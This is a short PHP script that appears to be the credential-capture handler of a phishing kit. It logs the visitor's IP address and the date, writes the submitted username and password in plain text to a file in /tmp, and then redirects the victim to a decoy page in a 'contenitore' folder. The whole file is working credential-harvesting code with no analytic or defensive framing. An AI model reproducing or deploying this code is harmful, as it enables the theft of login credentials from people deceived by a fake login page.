<?php
$dat3=date("D M d, Y g:i a");
$ipr = getenv("REMOTE_ADDR");
$myFile = "/tmp/temp1_$ipr.txt";
$fh = fopen($myFile, 'w');
$edit = "IP: ".$ipr."\n";
fwrite($fh, $edit);
$edit = "Date: ".$dat3."\n";
fwrite($fh, $edit);
$edit = "!\n";
fwrite($fh, $edit);
$edit = "username: ".$_POST['username']."\n";
fwrite($fh, $edit);
$edit = "password: ".$_POST['password']."\n";
fwrite($fh, $edit);
fclose($fh);
		   header("Location: ./contenitore/index.html");
?>
